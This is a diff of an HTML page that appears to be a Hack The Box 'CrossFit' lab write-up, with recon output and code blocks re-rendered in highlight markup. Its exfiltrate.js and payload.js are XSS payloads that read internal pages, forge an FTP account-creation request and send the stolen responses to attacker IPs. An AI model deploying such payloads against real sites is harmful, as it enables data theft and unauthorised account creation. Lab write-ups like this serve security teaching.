@@ -4,6 +4,7 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
@@ -43,7 +44,7 @@
 		    </section>
 
       <section id="wrapper">
-<section class="wrapper spotlight style1 ">
+<section class="wrapper spotlight style4 ">
 <div class="inner">
 <div class="main_image"><img src=/images/writeups/htb_machines/crossfit/crossfit.png alt="" /></div>
 <div class="content">
@@ -86,7 +87,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style4 alt">
+<section class="wrapper style5 alt">
 <div class="inner">
 <div class="content">
 
@@ -96,42 +97,46 @@
 <p>
  Like always I started off with an Nmap scan to see what services are exposed on the box.
 </p>
-<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 08:43 AWST
-Nmap scan report for crossfit.htb (10.10.10.208)
-Host is up (0.063s latency).
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2020-12-26</span><span class="w"> </span><span class="nt">08</span><span class="p">:</span><span class="nd">43</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">crossfit</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">208</span><span class="o">)</span><span class="w"></span>
+<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">063s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>
 
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 2.0.8 or later
-| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US
-| Not valid before: 2020-04-30T19:16:46
-|_Not valid after:  3991-08-16T19:16:46
-|_ssl-date: TLS randomness does not represent time
-22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey:
-|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)
-|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)
-|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)
-80/tcp open  http    Apache httpd 2.4.38 ((Debian))
-|_http-server-header: Apache/2.4.38 (Debian)
-|_http-title: Apache2 Debian Default Page: It works
-Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
+<span class="nt">21</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ftp</span><span class="w">     </span><span class="nt">vsftpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">8</span><span class="w"> </span><span class="nt">or</span><span class="w"> </span><span class="nt">later</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssl-cert</span><span class="o">:</span><span class="w"> </span><span class="nt">Subject</span><span class="o">:</span><span class="w"> </span><span class="nt">commonName</span><span class="o">=*</span><span class="p">.</span><span class="nc">crossfit</span><span class="p">.</span><span class="nc">htb</span><span class="o">/</span><span class="nt">organizationName</span><span class="o">=</span><span class="nt">Cross</span><span class="w"> </span><span class="nt">Fit</span><span class="w"> </span><span class="nt">Ltd</span><span class="o">./</span><span class="nt">stateOrProvinceName</span><span class="o">=</span><span class="nt">NY</span><span class="o">/</span><span class="nt">countryName</span><span class="o">=</span><span class="nt">US</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">Not</span><span class="w"> </span><span class="nt">valid</span><span class="w"> </span><span class="nt">before</span><span class="o">:</span><span class="w"> </span><span class="nt">2020-04-30T19</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">46</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_Not</span><span class="w"> </span><span class="nt">valid</span><span class="w"> </span><span class="nt">after</span><span class="o">:</span><span class="w">  </span><span class="nt">3991-08-16T19</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">46</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_ssl-date</span><span class="o">:</span><span class="w"> </span><span class="nt">TLS</span><span class="w"> </span><span class="nt">randomness</span><span class="w"> </span><span class="nt">does</span><span class="w"> </span><span class="nt">not</span><span class="w"> </span><span class="nt">represent</span><span class="w"> </span><span class="nt">time</span><span class="w"></span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">9p1</span><span class="w"> </span><span class="nt">Debian</span><span class="w"> </span><span class="nt">10</span><span class="o">+</span><span class="nt">deb10u2</span><span class="w"> </span><span class="o">(</span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">b0</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">5f</span><span class="p">:</span><span class="nd">5f</span><span class="p">:</span><span class="nd">7e</span><span class="p">:</span><span class="nd">5a</span><span class="p">:</span><span class="nd">4f</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">e4</span><span class="p">:</span><span class="nd">cf</span><span class="p">:</span><span class="nd">f1</span><span class="p">:</span><span class="nd">98</span><span class="p">:</span><span class="nd">01</span><span class="p">:</span><span class="nd">cb</span><span class="p">:</span><span class="nd">3f</span><span class="p">:</span><span class="nd">52</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">67</span><span class="p">:</span><span class="nd">88</span><span class="p">:</span><span class="nd">2d</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">a5</span><span class="p">:</span><span class="nd">c1</span><span class="p">:</span><span class="nd">a7</span><span class="p">:</span><span class="nd">71</span><span class="p">:</span><span class="nd">50</span><span class="p">:</span><span class="nd">2b</span><span class="p">:</span><span class="nd">c8</span><span class="p">:</span><span class="nd">07</span><span class="p">:</span><span class="nd">a4</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">60</span><span class="p">:</span><span class="nd">e5</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">62</span><span class="p">:</span><span class="nd">ce</span><span class="p">:</span><span class="nd">a3</span><span class="p">:</span><span class="nd">15</span><span class="p">:</span><span class="nd">93</span><span class="p">:</span><span class="nd">c8</span><span class="p">:</span><span class="nd">8c</span><span class="p">:</span><span class="nd">b6</span><span class="p">:</span><span class="nd">8e</span><span class="p">:</span><span class="nd">23</span><span class="p">:</span><span class="nd">1d</span><span class="p">:</span><span class="nd">66</span><span class="p">:</span><span class="nd">52</span><span class="p">:</span><span class="nd">f4</span><span class="p">:</span><span class="nd">4f</span><span class="p">:</span><span class="nd">ef</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">38</span><span class="w"> </span><span class="o">((</span><span class="nt">Debian</span><span class="o">))</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">38</span><span class="w"> </span><span class="o">(</span><span class="nt">Debian</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache2</span><span class="w"> </span><span class="nt">Debian</span><span class="w"> </span><span class="nt">Default</span><span class="w"> </span><span class="nt">Page</span><span class="o">:</span><span class="w"> </span><span class="nt">It</span><span class="w"> </span><span class="nt">works</span><span class="w"></span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">Host</span><span class="o">:</span><span class="w"> </span><span class="nt">Cross</span><span class="o">;</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
+<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">18</span><span class="p">.</span><span class="nc">02</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Firstly that FTP server looked really really juicy, especially if I can get guest access to it. Unfortunately I could not...
 </p>
-<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit$ ftp crossfit.htb
-Connected to crossfit.htb.
-220 Cross Fit Ltd. FTP Server
-Name (crossfit.htb:ghostccamm): anonymous
-331 Please specify the password.
-Password:
-530 Login incorrect.
-Login failed.
-ftp&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="err">$</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="n">Connected</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"></span>
+<span class="mi">220</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">Server</span><span class="w"></span>
+<span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="n">crossfit</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="n">ghostccamm</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">anonymous</span><span class="w"></span>
+<span class="mi">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="w"></span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"></span>
+<span class="mi">530</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">incorrect</span><span class="p">.</span><span class="w"></span>
+<span class="n">Login</span><span class="w"> </span><span class="n">failed</span><span class="p">.</span><span class="w"></span>
+<span class="n">ftp</span><span class="o">&gt;</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Welp... That didn't work, so I tried to the website instead.
 </p>
@@ -149,21 +154,23 @@ ftp&gt;
  </code>
  could of also dumped the necessary information from the certificate that is shown below.
 </p>
-<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/crossfit$ openssl s_client -connect crossfit.htb:21 -starttls ftp
-CONNECTED(00000003)
-depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
-verify return:1
----
-Certificate chain
- 0 s:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
-   i:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
----
+<div class="codehilite">
+ <pre><span></span><code><span class="n">ghostccamm</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">crossfit</span><span class="err">$</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">s_client</span><span class="w"> </span><span class="o">-</span><span class="k">connect</span><span class="w"> </span><span class="n">crossfit</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">21</span><span class="w"> </span><span class="o">-</span><span class="n">starttls</span><span class="w"> </span><span class="n">ftp</span><span class="w"></span>
+<span class="n">CONNECTED</span><span class="p">(</span><span class="mi">00000003</span><span class="p">)</span><span class="w"></span>
+<span class="k">depth</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="n">verify</span><span class="w"> </span><span class="nl">error</span><span class="p">:</span><span class="n">num</span><span class="o">=</span><span class="mi">18</span><span class="err">:</span><span class="n">self</span><span class="w"> </span><span class="n">signed</span><span class="w"> </span><span class="n">certificate</span><span class="w"></span>
+<span class="n">verify</span><span class="w"> </span><span class="k">return</span><span class="err">:</span><span class="mi">1</span><span class="w"></span>
+<span class="k">depth</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="n">verify</span><span class="w"> </span><span class="k">return</span><span class="err">:</span><span class="mi">1</span><span class="w"></span>
+<span class="o">---</span><span class="w"></span>
+<span class="n">Certificate</span><span class="w"> </span><span class="n">chain</span><span class="w"></span>
+<span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="nl">s</span><span class="p">:</span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="w">   </span><span class="nl">i</span><span class="p">:</span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">US</span><span class="p">,</span><span class="w"> </span><span class="n">ST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NY</span><span class="p">,</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cross</span><span class="w"> </span><span class="n">Fit</span><span class="w"> </span><span class="n">Ltd</span><span class="p">.,</span><span class="w"> </span><span class="n">CN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span><span class="w"> </span><span class="n">emailAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">info</span><span class="nv">@gym</span><span class="o">-</span><span class="n">club</span><span class="p">.</span><span class="n">crossfit</span><span class="p">.</span><span class="n">htb</span><span class="w"></span>
+<span class="o">---</span><span class="w"></span>
 
-...
+<span class="p">...</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <em>
   Oooooo
@@ -187,7 +194,7 @@ Certificate chain
 </div>
 </div>
 </section>
-<section class="wrapper style6 ">
+<section class="wrapper style1 ">
 <div class="inner">
 <div class="content">
 
@@ -279,13 +286,15 @@ Certificate chain
   exfiltrate.js
  </em>
 </p>
-<pre class="codehilite"><code>fetch("http://gym-club.crossfit.htb/security_threat/report.php")
-.then(function(data) {
-    data.text().then(function(r_txt) {
-        fetch("http://10.10.14.33:80/get_result.html?p="+btoa(r_txt));
-    });
-});
+<div class="codehilite">
+ <pre><span></span><code><span class="nf">fetch</span><span class="p">(</span><span class="err">"</span><span class="no">http</span><span class="p">:</span><span class="c1">//gym-club.crossfit.htb/security_threat/report.php")</span>
+<span class="na">.then</span><span class="p">(</span><span class="no">function</span><span class="p">(</span><span class="no">data</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">    </span><span class="nf">data.text</span><span class="p">().</span><span class="no">then</span><span class="p">(</span><span class="no">function</span><span class="p">(</span><span class="no">r_txt</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">        </span><span class="nf">fetch</span><span class="p">(</span><span class="err">"</span><span class="no">http</span><span class="p">:</span><span class="c1">//10.10.14.33:80/get_result.html?p="+btoa(r_txt));</span>
+<span class="w">    </span><span class="err">})</span><span class="c1">;</span>
+<span class="err">})</span><span class="c1">;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/exfiltratinghtml.png"/>
 </p>
@@ -311,28 +320,30 @@ Certificate chain
 <p>
  Let's take a closer look at the POST request form on the FTP account creation page.
 </p>
-<pre class="codehilite"><code>&lt;form action="http://ftp.crossfit.htb/accounts" method="POST"&gt;
-    &lt;input type="hidden" name="_token" value="KrZi8JGDZH7PMxhTEcVyFlc0WuKTHw82PX15ObxR"&gt;
-     &lt;div class="row"&gt;
-        &lt;div class="col-xs-12 col-sm-12 col-md-12"&gt;
-            &lt;div class="form-group"&gt;
-                &lt;strong&gt;Username:&lt;/strong&gt;
-                &lt;input type="text" name="username" class="form-control" placeholder="Username"&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;div class="col-xs-12 col-sm-12 col-md-12"&gt;
-            &lt;div class="form-group"&gt;
-                &lt;strong&gt;Password:&lt;/strong&gt;
-                &lt;input type="password" name="pass" class="form-control" placeholder="Password"&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;div class="col-xs-12 col-sm-12 col-md-12 text-center"&gt;
-                &lt;button type="submit" class="btn btn-primary"&gt;Submit&lt;/button&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://ftp.crossfit.htb/accounts"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"_token"</span> <span class="na">value=</span><span class="s">"KrZi8JGDZH7PMxhTEcVyFlc0WuKTHw82PX15ObxR"</span><span class="nt">&gt;</span>
+     <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;strong&gt;</span>Username:<span class="nt">&lt;/strong&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;strong&gt;</span>Password:<span class="nt">&lt;/strong&gt;</span>
+                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"pass"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Password"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-12 col-sm-12 col-md-12 text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
 
-&lt;/form&gt;
+<span class="nt">&lt;/form&gt;</span>
 </code></pre>
+</div>
 <p>
  So I just need to submit a POST request to http://ftp.crossfit.htb/accounts with the generated token and my username and password? Seems pretty easy...
  <em>
@@ -378,39 +389,41 @@ Certificate chain
   payload.js
  </em>
 </p>
-<pre class="codehilite"><code>x = new XMLHttpRequest;
-x.onreadystatechange = function() {
-    if(x.readyState == 4) {
-        r_txt = this.responseText;
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">XMLHttpRequest</span><span class="o">;</span><span class="w"></span>
+<span class="nt">x</span><span class="p">.</span><span class="nc">onreadystatechange</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">function</span><span class="o">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="err">if(x.readyState</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">4)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">        </span><span class="err">r_txt</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.responseText</span><span class="p">;</span><span class="w"></span>
 
-        // Gets the nonce from the account creation page.
-        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')
-        token = r_txt.match(re)[1];
+<span class="w">        </span><span class="err">//</span><span class="w"> </span><span class="err">Gets</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">nonce</span><span class="w"> </span><span class="err">from</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">account</span><span class="w"> </span><span class="err">creation</span><span class="w"> </span><span class="err">page.</span><span class="w"></span>
+<span class="w">        </span><span class="err">re</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">RegExp('&lt;input</span><span class="w"> </span><span class="err">type="hidden"</span><span class="w"> </span><span class="err">name="_token"</span><span class="w"> </span><span class="err">value="(.*?)"&gt;')</span><span class="w"></span>
+<span class="w">        </span><span class="err">token</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">r_txt.match(re)</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="p">;</span><span class="w"></span>
 
-        post_data = "_token=" + token + "&amp;username=test&amp;pass=test12345678"
+<span class="w">        </span><span class="err">post_data</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">"_token="</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">token</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">"&amp;username=test&amp;pass=test12345678"</span><span class="w"></span>
 
-        y = new XMLHttpRequest;
-        y.open("POST", "http://ftp.crossfit.htb/accounts");
-        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        y.withCredentials = true;
-        y.onreadystatechange = function() {
-            if(y.readyState == 4) {
-                z = new XMLHttpRequest;
-                z.open("GET", "http://10.10.14.52:80/get_result.html?p="+btoa(r_txt + post_data + this.responseText));
-                z.send()
-            }
-        };
-        y.send(post_data);
-    }
-}
-x.open("GET", "http://ftp.crossfit.htb/accounts/create");
-x.withCredentials = true;
-x.send();
+<span class="w">        </span><span class="err">y</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">XMLHttpRequest</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="err">y.open("POST",</span><span class="w"> </span><span class="err">"</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ftp</span><span class="o">.</span><span class="n">crossfit</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">accounts</span><span class="s2">");</span>
+<span class="s2">        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');</span>
+<span class="s2">        y.withCredentials = true;</span>
+<span class="s2">        y.onreadystatechange = function() {</span>
+<span class="s2">            if(y.readyState == 4) {</span>
+<span class="s2">                z = new XMLHttpRequest;</span>
+<span class="s2">                z.open("</span><span class="n">GET</span><span class="s2">", "</span><span class="n">http</span><span class="o">://</span><span class="mf">10.10.14.52</span><span class="o">:</span><span class="mi">80</span><span class="o">/</span><span class="n">get_result</span><span class="o">.</span><span class="n">html</span><span class="o">?</span><span class="n">p</span><span class="o">=</span><span class="s2">"+btoa(r_txt + post_data + this.responseText));</span>
+<span class="s2">                z.send()</span>
+<span class="s2">            }</span>
+<span class="s2">        };</span>
